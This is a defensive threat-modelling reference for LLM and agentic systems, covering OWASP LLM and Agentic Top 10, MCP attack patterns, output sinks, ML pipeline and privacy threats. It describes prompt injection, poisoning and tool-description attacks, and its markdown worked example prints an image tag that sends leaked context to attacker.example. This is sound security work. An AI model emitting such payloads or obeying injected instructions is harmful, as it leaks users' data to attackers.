# AI/ML and Agentic Threat Modelling Reference

Apply this reference when the system under review involves any of:

- LLM or chatbot integration (hosted vendors or local models)
- Prompt construction from user input, retrieved content, tool outputs, agent outputs, or memory
- Embeddings, vector stores, or semantic search (RAG pipelines)
- ML model training, fine-tuning, or inference
- Recommendation systems or automated decision-making
- AI agents, tool use, MCP servers, or any autonomous workflow
- Any classifier whose output gates a security-relevant decision

The threats in this reference sit *alongside* STRIPED. Apply STRIPED to the application logic, then walk this reference to surface the AI-specific failure modes that STRIPED alone will not catch. Cloud-resident AI systems also need `cloud-threats.md`.

## Contents

1. Two Foundational Concepts (adversarial subspace, decision boundary transfer, the Cox thesis)
2. The Third Structural Hazard: Context Rot
3. OWASP LLM Top 10 (2025) — with deeper treatment of LLM01
4. OWASP Agentic Top 10 (ASI01–ASI10)
— Companion catalogues: Elevation of Autonomy (`elevation-of-autonomy.md`), MITRE ATLAS (`ai-ml-atlas.md`)
5. MCP-Specific Threat Surface
6. Output Handling and Sanitisation at Every Sink
7. ML Pipeline Threats (non-LLM models)
8. Privacy: LINDDUN, T.R.I.M., GDPR
9. Plot4AI
10. Mitigation-to-Threat Traceability (design-time / runtime / process; mitigation matrix)
11. References

---

## 1. Two Foundational Concepts

Read these first. Everything else in this document is downstream of these two ideas. Both are mathematical properties of how AI systems work, and both make the obvious-looking model-layer defences structurally weaker than they appear.

### 1.1 The Adversarial Subspace

An AI system never sees what the user typed. The text, image, audio, or code is projected into a numerical representation before the model touches it, and the projection is lossy. Different inputs phrased in completely different ways routinely flatten to nearly identical numerical representations inside the model. It is the opposite of a hash: many inputs collide on the same representation.

The consequence: for any behaviour you want to enforce or block, there is a *space* of inputs that produces it, not a list. The subspace of inputs that will jailbreak a given guardrail is mathematically enormous. Every paraphrase, every translation, every encoding, every nonsense-padded variant, every structurally novel prompt nobody has tried yet. Cox and Bunzel (2025) quantifies these subspaces and the answer is unambiguous: too large to enumerate, too large to search, too large to defend by pattern-matching.

**Operational consequence.** Blocklists and prompt libraries are theatre. They cover a vanishing fraction of the real attack surface. Each new jailbreak you patch eliminates a single point in an infinite space.

### 1.2 Decision Boundaries Belong to the Domain, Not the Model

Tramèr et al. (2017), building on adversarial ML work going back to Goodfellow et al. (2015), showed that any two models trained on the same kind of problem carve out approximately the same surface in feature space, regardless of algorithm, architecture, or training data. The boundary is determined by the problem, not the training pipeline.

**Operational consequence.** An attacker who wants to bypass your classifier does not need to steal it, query it adversarially, or see its weights. They train a cheap surrogate on public data, find perturbations that flip the surrogate, and apply them to your system. The boundary you defend is approximately public the moment you choose the problem. Closed weights do not protect you. Swapping models is not a mitigation.

### 1.3 The Cox Thesis: Defences Must Be Deterministic and Outside the Model

These two facts together bound what any model-layer defence can achieve. The boundary is not private. The subspace of inputs that reach any point on it is not enumerable. Runtime red teaming, pattern-matching guardrails, content classifiers, and refusal training all produce average-case improvements but none of them reach certainty, and none of them survive a competent adversary over a long enough timeline.

What remains is structural. **Every consequential guarantee must be enforced in a deterministic layer outside the model.** Authorisation at the data layer, not in the content policy. Human confirmation on irreversible actions. Allow-listed tool arguments. Rate and cost limits. Output filtering at every sink. None of these care whether the model can be jailbroken, because none of them depend on the model behaving correctly for the guarantee to hold.

The model is a filter. The enforcement is elsewhere. This split runs through every mitigation in this reference, and any finding that ends "the model will refuse" is an unmitigated finding.

---

## 2. The Third Structural Hazard: Context Rot

Chroma's 2025 research on context rot, building on Liu et al. (2023) "Lost in the Middle", established that LLM performance degrades non-uniformly as context grows. Instructions placed at the top of the system prompt lose attention weight as the conversation extends. Critical safety constraints that sit 60,000 tokens deep may as well not be there.

**The three structural hazards together.** Adversarial subspace, decision boundary transfer, and context rot are properties of the architecture rather than properties of any particular deployment. None of them can be patched. All of them must be designed around.

**Diagnostic questions.**

- How long do sessions get before they reset?
- Where in the context window do the safety-critical instructions sit by turn 50?
- Is there periodic re-injection of the system prompt, user identity, and hard constraints?
- Are high-stakes operations forced into fresh sessions?
- Is there observability on context length so anomalous growth triggers an alert?

**Mitigations.** Context budgets well below the advertised window. Fresh sessions for irreversible operations. Rolling re-injection of critical instructions. None of this makes the model reliable. It just keeps the failure mode narrow enough that the deterministic layer outside the model can still catch it.

---

## 3. OWASP LLM Top 10 (2025)

Tag findings inline as `[LLM01]`, `[LLM02]`, etc.

| # | Threat | Core Question |
|---|--------|--------------|
| LLM01 | Prompt Injection | Can any input channel (user, RAG, tool output, memory, agent-to-agent) contain instructions that the model will obey? |
| LLM02 | Sensitive Information Disclosure | Can the model be prompted to reveal training data, system prompts, retrieved content, or context from other users? |
| LLM03 | Supply Chain | Are model providers, datasets, fine-tuning pipelines, prompt templates, MCP servers, and adapters versioned, signed, and reviewed? |
| LLM04 | Data and Model Poisoning | Can an attacker influence training data, fine-tuning data, RAG corpora, or memory writes to alter behaviour? |
| LLM05 | Improper Output Handling | Is model output treated as untrusted at every downstream sink (renderer, logger, tool argument, database, queue)? |
| LLM06 | Excessive Agency | Does the model have access to more tools, actions, or scope than the task requires? Are destructive actions reversible? |
| LLM07 | System Prompt Leakage | Does the system prompt contain anything that should not leak? It will eventually. |
| LLM08 | Vector and Embedding Weaknesses | Is the vector store access-controlled at query time? Is the corpus integrity-verified? Is retrieved content sanitised before injection into context? |
| LLM09 | Misinformation | Are outputs grounded against authoritative sources? Are package names, citations, and facts existence-checked before action? |
| LLM10 | Unbounded Consumption | Are token budgets, request rates, costs, and loop iterations bounded? |

### Prompt Injection (LLM01) — Deeper Treatment

Prompt injection is not "a thing users sometimes do". It is the working assumption: anything the model reads can be interpreted as an instruction.

**Direct injection.** User input contains instructions intended to override the system prompt.

**Indirect injection.** External content reaches the model through retrieval, tool output, memory, or another agent. The most dangerous variants because the user is unaware their action triggered the payload. Examples: a Confluence page edited months ago by a contractor who has since left; a tool description on an MCP server updated silently between approval and use; a memory write from a previous session that an attacker placed deliberately.

**Mitigations (deterministic, outside the model).**

- Treat *every* input channel as untrusted: user, RAG, tool output, memory, agent-to-agent.
- Spotlighting: explicit structural delimiters between system, user, and retrieved content.
- Out-of-band confirmation for destructive or externally-visible actions.
- Output filtering at every sink that could become an exfiltration channel.
- Authorisation enforced at the data layer, not in the prompt.
- Never rely on model refusal as the security guarantee. Refusal is best-effort. Enforcement is deterministic.

---

## 4. OWASP Agentic Top 10 (ASI01–ASI10, December 2025)

Specific to systems where the model takes actions, not just answers questions. Tag inline as `[ASI03]` etc.

| # | Threat | Core Question |
|---|--------|--------------|
| ASI01 | Agent Goal Hijack | Can a prompt injection redirect the agent's task? |
| ASI02 | Tool Misuse and Exploitation | Can the agent be induced to use a legitimate tool destructively? |
| ASI03 | Identity and Privilege Abuse | Are agents using shared service accounts? Are credentials per-agent and short-lived? |
| ASI04 | Agentic Supply Chain | Are MCP servers, tool descriptions, prompt templates, and adapters under version control with review on update? |
| ASI05 | Unexpected Code Execution | Is generated code sandboxed with no network, no host filesystem, no shared state? |
| ASI06 | Memory and Context Poisoning | Can an attacker write to memory in a way that persists into future sessions? |
| ASI07 | Inter-Agent Communication Exploitation | Do agents authenticate each other? Are inter-agent messages structured and signed? |
| ASI08 | Cascading Failures | Does one agent's hallucination become another's ground truth? Are there circuit breakers? |
| ASI09 | Human-Agent Trust Exploitation | Does the UX surface provenance, or does it conceal it? |
| ASI10 | Rogue Agents | Is there an agent inventory? Centralised kill switches? Behavioural baselining? |

---

## Companion catalogues (separate files)

- **Elevation of Autonomy card deck** — `references/elevation-of-autonomy.md`. Use for elicitation per element; tag `[EoA·SA]`, `[EoA·T7]` etc.
- **MITRE ATLAS** — `references/ai-ml-atlas.md`. Use after elicitation to sequence findings into attack paths, map to detection, and rate likelihood from observed maturity; tag `[ATLAS AML.T0051.001]`.
- **Report layout** for the AI/ML Threat Surface section lives in `references/templates/threat-model-template.md` (§6b), not here.

---

## 5. MCP-Specific Threat Surface

Model Context Protocol has become the dominant operational risk in agentic deployments. Treat any MCP integration as a deliberate trust boundary, not an integration convenience.

### The Mental Model

Every MCP server in a client sees: every prompt routed to its tools, every credential or token shared with it, and every return value. Multiple servers in one client can shadow each other's tools, share context that should be partitioned, and route data between mutually-distrusting trust zones via the client.

### The MCP Attack Patterns

| Pattern | What it is |
|---------|-----------|
| Tool Description Injection | The description field arrives in the model's context as instructions and can carry adversarial content |
| Description Rug Pull | Approved version and live version diverge silently after install |
| Server Impersonation | Typosquatted, hijacked, or adversarial server in a trusted registry |
| Cross-Server Confused Deputy | One server's tool shadows or intercepts another's; one server reads context belonging to another |
| Cross-Server Exfiltration | Data from a high-sensitivity server is passed as an argument to a low-trust server via the client |
| Supply Chain Compromise | Legitimate server on install; malicious after a maintainer compromise three weeks later |

### MCP Mitigations

- Review on install *and* on every update. Tool descriptions get re-read on every version bump.
- Sandbox each server with its own identity, network egress policy, and filesystem view.
- Pin versions and verify signatures where available.
- Namespace tool names per server. Prevent two servers registering the same tool.
- Client-side data-flow policy: data from server A cannot be passed as an argument to server B without explicit allow.
- Surface to the user, in language they can verify, which server a tool call is going to.
- AI-BOM entry for every MCP server.

---

## 6. Output Handling and Sanitisation at Every Sink

This is the area where teams most consistently leave a load-bearing assumption inside the model. The OWASP framing (LLM05 Improper Output Handling) covers it, but the operational pattern is worth treating as its own discipline because it is what most actually exploitable findings collapse into.

**Working assumption: model output is untrusted input to every downstream system.** This includes renderers, loggers, databases, queues, tool arguments, agent-to-agent messages, and other LLM contexts. The model has no notion of "this output is for a human" vs "this output is for a parser". A prompt injection that succeeds will produce output crafted for whichever sink the attacker is targeting.

### Sinks That Need Filtering

Walk this list during a design review. For each sink the model output reaches, identify the deterministic check that runs before the output is consumed.

| Sink | Threat | Deterministic control |
|------|--------|----------------------|
| Markdown renderer | Image and link tags exfiltrating context via URL parameters; iframe injection | Content Security Policy that blocks remote image and iframe loads; strip active content; render in a subset of markdown |
| HTML renderer | XSS via `<script>`, event handlers, `javascript:` URLs | Allowlist sanitiser (DOMPurify, bleach, jsoup); CSP; never `innerHTML` |
| Tool arguments | Arguments outside the intended set (delete instead of read; wildcard instead of specific resource) | Allow-listed argument values; structured schemas; type and range validation |
| Shell or code execution | Command injection; metacharacter abuse | Argument arrays not strings; no shell interpolation; sandbox with no host access |
| Database queries | Injection via generated query fragments | Parameterised queries; ORM-only; never concatenate model output into SQL |
| Logs | Secret and PII leakage; log injection (newlines, ANSI); downstream log-parsing exploits | PII and secret scrubber; canonicalise newlines; structured JSON logs only |
| Other LLM context | Indirect injection chained through agent-to-agent messages | Treat as untrusted retrieval; spotlight; structured message validation |
| Email or chat post | Markdown image exfiltration; phishing content; reply-chain prompt injection | Subset markdown; strip image and link tags from generated content; never auto-send |
| File writes | Path traversal; arbitrary write into source tree, config, or memory store | Path allow-list; canonical path check; per-tool filesystem view |
| Memory store | Memory poisoning that persists across sessions | Provenance tags; per-user partition; treat reads as untrusted on next session |
| Vector store writes | Corpus poisoning | Source provenance; integrity hashes; write-time content classification |

### Filter Placement Principles

- **Filter at the sink, not at the source.** A filter on the model output that runs before knowing which sink will consume it has to defend every sink at once and will defend none of them well.
- **The filter is a parser for the sink's grammar, not a regex.** Block by structural validity in the consumer's grammar (an HTML allowlist sanitiser, a SQL parameter binder, a path canonicaliser), not by string-matching dangerous patterns in the producer's output.
- **Structured output schemas where the answer permits.** If the answer should be a ticket ID, the response should be a ticket ID, not a paragraph that contains one. JSON schema validation before any consumer touches the content.
- **Strip before forward.** When passing model output to another agent, another tool, or another LLM context, strip what that downstream consumer does not need. Output minimisation is the T.R.I.M. move teams most often miss.
- **Output filtering is a backstop, not the primary defence.** The primary defence is preventing the injection from succeeding at all (spotlighting, authorisation at the data layer, untrusted-content boundaries). The filter catches the residual.

### Worked Example: Markdown Image Exfiltration

The agent renders a code review as markdown. The chat UI renders markdown including image tags. A prompt injection in retrieved content causes the output to include `![loading](https://attacker.example/?data=<leaked context>)`. The UI fetches the image. The attacker reads the request log. The context is exfiltrated.

The deterministic mitigation is at the renderer (the sink), not at the model. Content Security Policy with an `img-src` directive that blocks third-party origins. Markdown subset rendering that strips image and link tags entirely. Both run regardless of what the model output contains.

---

## 7. ML Pipeline Threats (Non-LLM Models)

For classifiers, regression models, and recommendation systems where the model itself is the asset.

### Model Threats

| Threat | Description |
|--------|-------------|
| Adversarial Examples | Crafted inputs that cause misclassification while appearing normal |
| Geometric Attacks | Decision-boundary probing (GeoDA, SurFree, Triangular Attack); geometry-aware attacks on non-Euclidean models (AGSM); angular-margin attacks on hyperspherical embeddings |
| Model Extraction | Repeated queries to reconstruct model behaviour or weights |
| Membership Inference | Determining whether a specific record was in the training set |
| Model Inversion | Reconstructing training data from model outputs |
| Decision Boundary Transfer | Surrogate-model attacks: train a cheap classifier on public data, find perturbations on the surrogate, apply to the target |

### Pipeline Threats

| Threat | Description |
|--------|-------------|
| Data Poisoning | Injecting malicious samples into training data to backdoor the model |
| Feature Injection | Manipulating input features at inference time |
| Dependency Attack | Compromised pretrained weights or libraries in the ML supply chain |
| Serialisation Attack | Malicious pickled model files (`.pkl`, `.h5`) executed during loading |

### Mitigations

- Never `pickle.load()` model files from untrusted sources. Use SafeTensors or ONNX.
- Verify checksums and signatures on downloaded model weights.
- Apply rate limiting and query budgets to inference endpoints to slow extraction and probing.
- For consequential decisions, do not let any single classifier's verdict be load-bearing. Layer with deterministic checks downstream.
- Adversarial robustness testing matched to the geometry the model uses (Euclidean vs hyperbolic vs angular).

---

## 8. Privacy: LINDDUN, T.R.I.M., GDPR

AI systems generate personal data as well as collect it. Hallucinations about real people are personal data under GDPR regardless of whether the underlying claim is true. Apply both LINDDUN and T.R.I.M. at output, not just at input.

### T.R.I.M. (from F-Secure Elevation of Privacy)

| Category | Question | AI-specific application |
|----------|---------|------------------------|
| Transfer | Where does personal data flow? | Including data the model creates at the point of transfer (Agent A hallucinates about a person, passes to Agent B as ground truth) |
| Retention and Removal | What persists, and can it be deleted? | Including hallucinations cached in RAG, written to memory, logged, fed into fine-tuning. Article 16 rectification across all of them |
| Inference | What can be derived? | Including special-category data (Article 9) inferred from non-sensitive inputs |
| Minimisation | Are we collecting only what is needed? | And generating only what is needed. A yes/no question producing four paragraphs of unrequested personal data is a minimisation failure |

### LINDDUN

| Threat | Applies to AI when... |
|--------|----------------------|
| Linking | Model correlates user behaviour across sessions or contexts unexpectedly |
| Identifying | Output identifies individuals from supposedly anonymised inputs |
| Non-repudiation | User cannot deny having submitted data used for training |
| Detecting | Inference reveals sensitive attributes (health, politics, sexuality) not explicitly provided |
| Data Disclosure | Model memorises and can reproduce training data verbatim, or generates plausible personal data about a real person |
| Unawareness | Users don't know their data is used for training, or that AI is making decisions about them |
| Non-compliance | Processing violates GDPR, CCPA, or sectoral law (no consent for training, no deletion mechanism, automated decision without Article 22 basis) |

### GDPR Article Mapping

| Article | What it requires | AI implication |
|---------|-----------------|----------------|
| 5(1)(a) | Lawfulness, fairness, transparency | Training data provenance documented |
| 5(1)(b) | Purpose limitation | Inference cannot exceed the lawful purpose of collection |
| 5(1)(c) | Data minimisation | Output minimisation as well as input minimisation |
| 5(1)(d) | Accuracy | Hallucination is an accuracy failure; rectification mechanism required |
| 9 | Special-category data | Inference of health, sexuality, religion, political views requires Article 9 basis |
| 13/14 | Information to data subject | Privacy notice must cover AI processing |
| 16 | Right to rectification | Must work across model outputs, not just databases |
| 17 | Right to erasure | Must work across RAG, memory, logs, training data |
| 22 | Automated decision-making | Human-in-the-loop or explicit Article 22 basis for consequential decisions |

### Privacy-Specific Mitigations

- Refuse-or-ground on personal-data queries. No free-form generation about real people.
- Rectification capability via a denylist layer in front of the model rather than touching the weights.
- Surgical deletion across every store that can contain personal data (RAG, memory, logs, eval datasets). Test with synthetic subject access requests.
- Data classification at the boundary. Tags travel with the data and gate which agents, tools, and memory stores can see it.
- DPIA at design time, not retrofitted. An agent with autonomous tool access over personal data is high-risk by almost any definition.

---

## 9. Plot4AI

Plot4AI extends LINDDUN with AI-specific failure modes. Use as a complement to LINDDUN/T.R.I.M., not a replacement.

| Category | Question |
|----------|---------|
| Profiling | Does the model build or reinforce detailed profiles of individuals? |
| Automated Decision-Making | Are consequential decisions made automatically without human oversight? |
| Discrimination | Could the model produce or amplify biased outcomes against protected groups? |
| Transparency | Can users understand how decisions affecting them were made (right to explanation)? |
| Linkage | Can supposedly anonymised data be re-identified via model outputs? |
| Non-repudiation | Are AI-assisted actions properly attributable and auditable? |

---

## 10. Mitigation-to-Threat Traceability

The mitigations that recur in good AI/agentic designs, grouped by what they actually do.

### Design-Time Structural Controls (Primary)

- **Least agency.** Per agent, per tool, per session. Default deny.
- **Assume the model will eventually obey adversarial input.** Every consequential action has a deterministic check outside the model.
- **Authorisation at the data layer, not the UI layer.** Vector store knows the caller. Row-level access control on every retrieval. Memory partitioned per user. Tool calls inherit the caller's identity, not a shared service account.
- **All retrieved content is untrusted.** Spotlighting. Content classifier on retrieval. For high-sensitivity tool calls, refuse to act on instructions that appear in retrieved content.
- **Input and output minimisation.** Strip personal data from prompts before sending to a hosted vendor. Constrain output schemas. Strip what downstream consumers do not need.
- **Sandbox every code execution.** Ephemeral container, no network egress, no host filesystem, no shared state. The interpreter is a hostile workload by assumption.
- **MCP isolation.** Per-server sandbox, scoped credentials, namespaced tools, client-side data-flow policy.

### Runtime Controls (Backstops)

- Rate and cost limits per user, per agent, per tool. Hard caps on agent loop iterations. Automated circuit breakers.
- Periodic re-injection of critical instructions (mitigates context rot for long sessions).
- Fresh sessions for high-stakes operations.
- Output filters at every sink (Section 6).
- Observability: log every tool call with arguments, every retrieved chunk, every memory write, every agent-to-agent message, the version of every tool description active at the time.
- Agent inventory analogous to Non-Human Identity discovery. Centralised kill switches.

### Process Controls

- Threat modelling at design time, not red teaming at runtime. Runtime red teaming of a specific model tells you very little about your actual attack surface because the surface is determined by the domain.
- MCP server review gate on install and on update.
- AI-BOM covering models, adapters, training data sources, MCP servers, prompt templates, and the prompt template versions deployed.
- Incident response playbook for AI-specific incidents: prompt injection confirmed, tool misuse detected, hallucinated PII reported, MCP server compromise.

### Mitigation Matrix

| Threat | Primary mitigation | Backstop |
|--------|-------------------|---------|
| LLM01 Prompt Injection | Spotlighting, authorisation at the data layer, out-of-band confirmation | Output filtering at every sink |
| LLM02 Sensitive Disclosure | Authorisation at the data layer, input minimisation | Output filter for PII and secrets |
| LLM03 Supply Chain | AI-BOM, MCP review gate | Runtime egress restriction |
| LLM04 Poisoning | Source provenance on RAG, anomaly detection on writes | Ensemble disagreement checks |
| LLM05 Output Handling | Structured output schemas, sanitisation at every sink | CSP on renderers |
| LLM06 Excessive Agency | Least agency, scoped per-tool credentials | Human confirmation gates |
| LLM07 System Prompt Leakage | No secrets in prompts, ever | Output filter |
| LLM08 Vector and Embedding | Row-level access control, tenant partition | Audit of retrievals |
| LLM09 Misinformation | Grounding, package existence checks | Human review for high-stakes |
| LLM10 Unbounded Consumption | Rate and cost limits, loop caps | Automated circuit breakers |
| ASI01 Goal Hijack | Spotlighting, least agency | Behavioural baselining |
| ASI02 Tool Misuse | Allow-listed tool arguments | Sandbox blast radius |
| ASI03 Identity Abuse | Per-agent scoped credentials | Token rotation |
| ASI04 Supply Chain | AI-BOM, MCP review | Sandbox isolation |
| ASI05 Code Execution | Sandbox with no network or filesystem | Runtime egress monitoring |
| ASI06 Memory Poisoning | Memory provenance, per-user partitioning | Periodic memory audit |
| ASI07 Inter-Agent | Mutual authentication between agents | Structured message validation |
| ASI08 Cascading Failures | Circuit breakers, idempotency keys | Kill switch |
| ASI09 Human-Agent Trust | UX provenance display, confirmation on external-facing actions | User training |
| ASI10 Rogue Agents | Agent inventory, behavioural baseline | Centralised kill switch |
| Context Rot | Rolling system-prompt re-injection, fresh sessions | Context-length observability |
| Decision Boundary Transfer | Design-time structural controls; do not rely on model robustness | None (cannot be mitigated at runtime) |
| Adversarial Subspace | Architectural enforcement outside the model | None (cannot be mitigated by pattern-matching) |
| LINDDUN/T.R.I.M. hallucination | Grounding, refusal, output filtering for PII | Rectification process |
| MCP Tool Description Injection | Review on install and update; namespaced tool names | Client-side data-flow policy |
| MCP Cross-Server Exfiltration | Data-flow policy between servers | Network-layer egress control |

Three rows are special: Adversarial Subspace, Decision Boundary Transfer, and (partly) Context Rot have no runtime backstop. The only mitigation is structural. If a finding maps to one of these, the report must describe how the architectural split places the security guarantee outside the model.

---

## 11. References

- **Goodfellow, Shlens, Szegedy** (2015), "Explaining and Harnessing Adversarial Examples", arXiv:1412.6572.
- **Tramèr, Papernot, Goodfellow, Boneh, McDaniel** (2017), "The Space of Transferable Adversarial Examples", arXiv:1704.03453.
- **Madry et al.** (2017), "Towards Deep Learning Models Resistant to Adversarial Attacks", arXiv:1706.06083.
- **Liu et al.** (2023), "Lost in the Middle: How Language Models Use Long Contexts", TACL.
- **Chroma Research**: Hong, Troynikov, Huber (2025), "Context Rot: How Increasing Input Tokens Impacts LLM Performance".
- **Cox and Bunzel** (2025), "Quantifying the Risk of Transferred Black Box Attacks", arXiv:2511.05102.
- **Esra and Cox** (2024), US Patent 12,093,400 B1, *Systems and Methods for Model Security in Distributed Model Training Applications*.
- **OWASP Top 10 for LLM Applications** (2025).
- **OWASP Top 10 for Agentic Applications** (ASI01–ASI10, December 2025).
- **OWASP AI Exchange** (Disesdi Shoshana Cox et al.).
- **Threat Modeling Manifesto**.
- **LINDDUN** (DistriNet, KU Leuven).
- **T.R.I.M.** (F-Secure Elevation of Privacy).
- **Plot4AI** privacy framework for AI.
- **Elevation of Autonomy** v0.1 (Crawley, 2026), CC-BY-SA-4.0, ostering.com.
- **MITRE ATLAS** https://atlas.mitre.org — machine-readable data: https://github.com/mitre-atlas/atlas-data (see `ai-ml-atlas.md`).
